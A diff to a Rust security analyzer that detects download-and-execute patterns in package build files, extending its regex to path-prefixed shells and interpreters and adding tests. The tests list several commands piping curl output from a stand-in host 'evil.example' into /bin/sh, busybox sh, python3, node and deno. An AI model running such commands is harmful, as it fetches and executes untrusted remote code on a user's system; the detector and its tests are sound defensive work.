@@ -15,7 +15,9 @@
 use super::SecurityAnalyzer;
 use crate::error::Result;
 use crate::rules::informational_lines;
-use crate::textutil::{deobfuscate, logical_lines, INTERPRETERS, SHELLS, SHELL_LAUNCHER};
+use crate::textutil::{
+    deobfuscate, logical_lines, INTERPRETERS, SHELLS, SHELL_LAUNCHER, SHELL_PATH,
+};
 use crate::types::{AnalysisContext, Category, Finding, Location, Severity};
 use async_trait::async_trait;
 use lazy_static::lazy_static;
@@ -31,9 +33,9 @@ lazy_static! {
     /// analyzer entirely (defect #6).
     static ref FETCH_EXEC: Regex = Regex::new(&format!(
         r#"(?x)
-        (curl|wget|aria2c|fetch)\b[^\n]*\|\s*{SHELL_LAUNCHER}{SHELLS}\b   # download | [launcher] shell
-        | (curl|wget|aria2c|fetch)\b[^\n]*\|\s*{INTERPRETERS}\b           # download | interpreter
-        | {SHELL_LAUNCHER}{SHELLS}\s+<\(\s*(curl|wget|fetch)\b            # [launcher] sh <(curl ...)
+        (curl|wget|aria2c|fetch)\b[^\n]*\|\s*{SHELL_LAUNCHER}{SHELL_PATH}\b{SHELLS}\b          # download | [launcher][path] shell
+        | (curl|wget|aria2c|fetch)\b[^\n]*\|\s*{SHELL_LAUNCHER}{SHELL_PATH}\b{INTERPRETERS}\b  # download | [launcher][path] interpreter
+        | {SHELL_LAUNCHER}{SHELL_PATH}\b{SHELLS}\b\s+<\(\s*(curl|wget|fetch)\b                 # [launcher][path] sh <(curl ...)
         | source\s+<\(\s*(curl|wget|fetch)\b                         # source <(curl ...)
         | \beval\s+["']?\$\(\s*(curl|wget|fetch)\b                   # eval "$(curl ...)"
         | \.\s+<\(\s*(curl|wget|fetch)\b                             # . <(curl ...)
@@ -213,20 +215,44 @@ mod tests {
     }
 
     #[test]
-    fn detects_launcher_prefixed_fetch_exec() {
-        // Task 4050 CR: `curl ... | busybox sh` / `| env sh` must trip
-        // EXEC-REMOTE via the shared SHELL_LAUNCHER prefix.
+    fn detects_launcher_path_and_interpreter_fetch_exec() {
+        // Task 4050 exhaustive scope: path-prefixed shells (`/bin/sh`),
+        // path+launcher (`/usr/bin/env sh`), path interpreters
+        // (`/usr/bin/python3`), and the expanded interpreter set must all trip
+        // EXEC-REMOTE.
         let a = RemoteExecAnalyzer::new();
         for cmd in [
+            "curl -fsSL https://evil.example/x.sh | /bin/sh",
             "curl -fsSL https://evil.example/x.sh | busybox sh",
-            "curl -fsSL https://evil.example/x.sh | env sh",
+            "curl -fsSL https://evil.example/x.sh | /usr/bin/env sh",
+            "curl -fsSL https://evil.example/x.sh | command busybox sh",
             "busybox sh <(curl -s https://evil.example/i)",
+            // interpreters (expanded set + path)
+            "curl -fsSL https://evil.example/x | /usr/bin/python3 -",
+            "curl -fsSL https://evil.example/x | node",
+            "curl -fsSL https://evil.example/x | deno run -",
+            "curl -fsSL https://evil.example/x | env python3",
         ] {
             let f = a.scan(cmd, Path::new("PKGBUILD"), false);
             assert!(
                 f.iter().any(|x| x.id == "EXEC-REMOTE"),
-                "launcher-prefixed fetch|exec must be caught: {cmd} -> {f:?}"
+                "launcher/path/interpreter fetch|exec must be caught: {cmd} -> {f:?}"
             );
+        }
+    }
+
+    #[test]
+    fn fetch_exec_no_fp_on_non_shell_pipe_target() {
+        // The path/launcher generalization must not flag a fetch piped to a
+        // non-shell, non-interpreter command.
+        let a = RemoteExecAnalyzer::new();
+        for cmd in [
+            "curl -fsSL https://example.com/x | /usr/bin/tee out",
+            "curl -fsSL https://example.com/x | env grep foo",
+            "curl -fsSL https://example.com/x | busybox cat",
+        ] {
+            let f = a.scan(cmd, Path::new("PKGBUILD"), false);
+            assert!(f.is_empty(), "non-shell pipe target must not fire EXEC-REMOTE: {cmd} -> {f:?}");
         }
     }
 
